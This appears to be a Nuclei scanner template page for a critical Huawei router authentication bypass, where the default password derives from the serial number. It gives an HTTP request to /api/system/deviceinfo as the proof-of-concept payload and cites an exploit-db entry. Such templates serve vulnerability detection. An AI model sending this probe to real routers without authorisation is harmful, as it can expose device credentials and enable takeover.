# Nuclei Template: Huawei Router - Authentication Bypass
**Template ID:** huawei-router-auth-bypass
**Vulnerability Class:** Authentication Bypass Using an Alternate Path or Channel
**Severity:** Critical
**CWE:** CWE-288
**Source:** Nuclei Template (`huawei-router-auth-bypass.yaml`)

## Vulnerability Information & PoC

## Description
Huawei Routers are vulnerable to authentication bypass because the default password of this router is the last 8 characters of the device's serial number which exist on the back of the device.

## Steps to reproduce / Exploit Payload
```http
GET /api/system/deviceinfo HTTP/1.1
Host: {{Hostname}}
Accept: application/json, text/javascript, */*; q=0.01
Referer: {{BaseURL}}
```

## References
- https://www.exploit-db.com/exploits/48310
